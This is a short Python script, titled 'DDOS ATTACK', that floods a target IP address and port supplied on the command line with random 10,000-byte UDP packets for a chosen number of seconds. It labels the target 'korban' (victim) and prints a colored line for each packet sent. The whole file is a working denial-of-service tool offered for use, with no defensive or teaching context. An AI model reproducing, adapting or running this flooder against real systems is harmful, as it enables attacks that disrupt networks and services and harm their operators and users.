#!/usr/bin/python

import time
from datetime import datetime
import socket
import random
import sys

def banner():
    print("""
##################
DDOS ATTACK
##################
""")

def flood(korban, vport, durasi):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(10000)
    timeout = time.time() + durasi
    sent = 999999999999 
    
    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (korban, vport))
        sent = sent + 1 
        n = datetime.now()
        print "\033[33m[{}-{}-{}".format(n.year, n.month, n.day)+"]\033[94m SUKSES TO -> [\033[91m%s\033[94m]\033[95m PORT [\033[91m%s\033[95m]\033[36m BYTES [\033[91m%s\033[36m]"%(korban, vport, sent) 

def main(): 
    if len(sys.argv) != 4:
        banner()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
        
if __name__ == '__main__':
    main()        
